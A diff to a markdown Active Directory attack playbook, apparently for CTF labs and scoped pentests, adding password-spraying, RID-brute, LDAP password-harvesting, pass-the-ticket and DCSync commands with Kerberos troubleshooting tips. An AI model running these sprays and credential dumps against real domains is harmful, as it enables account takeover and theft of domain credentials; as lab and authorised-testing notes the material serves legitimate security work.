@@ -17,6 +17,8 @@ Core pages: [[ad-enumeration]], [[kerberos-attacks]], [[adcs]], [[ad-lateral-mov
 - Confirm DC / domain in scope. Read `Deadends.md` + `loot.md` - **reuse captured creds first** before researching new ones (see [[default-credentials]]).
 - **Lockout gate before ANY spray:** read the policy - `nxc smb <dc> -u <user> -p <pass> --pass-pol`. RoE `no_bruteforce` / `passive_only` -> enumerate only, NO spray. Never exceed `(threshold - 1)` attempts per account per window.
 - **Clock skew:** sync to DC (`ntpdate <dc>` or `faketime`) or Kerberos TGT requests fail with `KRB_AP_ERR_SKEW`.
+- **Stale `/etc/hosts` realm entry silently breaks Kerberos.** A prior box's `<realm> -> <old-ip>` line makes impacket resolve the KDC to a dead host and hang with `[Errno 110] Connection timed out (REALM:88)`, even though certipy (which forces `-dc-ip`) worked seconds earlier. When you add the DC to `/etc/hosts`, REMOVE any existing line for the same realm, and ALWAYS pass `-dc-ip <dc>` (and `-target-ip <dc>`) on impacket Kerberos ops so KDC/target resolution never depends on DNS/hosts. Same fix if `certipy req` throws `The NETBIOS connection ... timed out`: add `-target-ip <dc>`.
+- **Hash recovered but the account blocks NTLM?** ESC1/UnPAC/PKINIT hands you BOTH an NT hash AND a TGT ccache. If PtH returns `STATUS_ACCOUNT_RESTRICTION` (the account is in Protected Users / NTLM-hardened, common for `Administrator`), the hash is a red herring - use the ccache: `export KRB5CCNAME=<user>.ccache; impacket-smbclient/secretsdump -k -no-pass -dc-ip <dc> <dc-fqdn>` reads flags / DCSyncs over Kerberos. See [[adcs]].
 - Never pivot through `192.168.1.x` hosts (Ligolo tunnel only for lateral movement).
 
 ## Attack Surface Signals
@@ -24,10 +26,22 @@ Ports: SMB 445, LDAP 389/636, Kerberos 88, ADWS 9389, WinRM 5985/5986, RPC 135, 
 Footholds: null/guest SMB, anonymous LDAP bind, AS-REP-roastable users (no preauth), SMB signing OFF (relay), `ms-DS-MachineAccountQuota > 0`, pre-Win2000 computers, LAPS readable.
 
 ## Methodology
+
+**Efficiency: fire the unauth-enum WAVE at once, don't grind it serially.** On a fresh DC the first
+6 reads are independent - launch them together (parallel tmux tabs / back-to-back), then read results:
+null+guest shares & RID-brute, anonymous LDAP users + **all `description`/`info` fields** (planted seed
+passwords live here), AS-REP roast of the whole user list, person-object SPN enum (Kerberoast), the
+LDAP lockout policy, AND `certipy find -vulnerable` (ADCS ESC is on MOST modern THM/HTB DCs - run it in
+the unauth wave with any cred you get, not as an afterthought). This one wave usually already contains
+the foothold (a description seed to spray) and the escalation (an ESC template).
+
 1. **Unauth enum:**
 ```bash
 nxc smb <dc> -u '' -p '' --shares            # null session
+nxc smb <dc> -u guest -p '' --rid-brute 5000 # guest RID cycling when null shares are denied
 nxc ldap <dc> -u '' -p '' --users            # anonymous bind
+# planted-password sweep (classic THM foothold) - read EVERY non-generic description:
+ldapsearch -x -H ldap://<dc> -b <base> "(objectClass=user)" sAMAccountName description
 enum4linux-ng -A <dc>;  rpcclient -U '' -N <dc>
 ```
 2. **Build the user list - harvest EXHAUSTIVELY, then validate (lockout-safe):**
@@ -42,7 +56,10 @@ for p in $(curl -s http://<t>/ | grep -oiE 'href="[^"]+\.html?"' | cut -d'"' -f2
   curl -s http://<t>/$p | sed -e 's/<[^>]*>/ /g'; done | grep -oE '[A-Z][a-z]+ [A-Z][a-z]+' | sort -u
 # -> for each "First Last": emit f.last, flast, first.last, first_last, last  (+ leaked-email format)
 kerbrute userenum -d <domain> --dc <dc> users.txt      # filler template names simply will NOT validate
-nxc smb <dc> -u users.txt -p 'Season2025!' --continue-on-success   # then one-pass spray, lockout-gated
+# SPRAY with kerbrute, NOT a large SMB loop: kerbrute passwordspray is parallel Kerberos pre-auth
+# (~500 users in seconds); `nxc smb -u <file>` walks them one TCP session at a time (minutes). Same
+# result, ~50x faster - reach for kerbrute first on any big list, keep nxc for the 1-off cred check.
+kerbrute passwordspray -d <domain> --dc <dc> users.txt 'CHANGEME2023!'   # one-pass, lockout-gated
 ```
    Every validated user is an AS-REP roast + spray target (step 3). Do NOT stop at the first/only name
    the homepage leaks.
